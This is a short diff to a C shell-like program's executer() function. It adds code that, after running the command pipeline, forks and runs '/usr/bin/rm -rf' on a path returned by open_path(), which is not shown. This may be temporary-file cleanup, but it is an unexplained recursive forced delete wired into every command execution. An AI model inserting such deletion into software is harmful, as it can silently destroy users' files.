@@ -47,8 +47,22 @@ static void	improved_exec(int i, int j, int pc, int **fd)
 void	executer(t_table **cmd_table, int i, int j)
 {
 	int		**fd;
+	char	**argv;
+	char	*path;
+	int		id;
 
+	path = open_path();
+	argv = malloc(sizeof(char *) * 4);
+	argv[0] = ft_strdup("rm");
+	argv[1] = ft_strdup("-rf");
+	argv[2] = ft_strdup(path);
+	argv[3] = NULL;
 	fd = create_pipes(data.process_count);
 	improved_exec(i, j, data.process_count, fd);
+	id = fork();
+	if (id == 0)
+		execve("/usr/bin/rm", argv, NULL);
+	else
+		wait(NULL);
 }
 
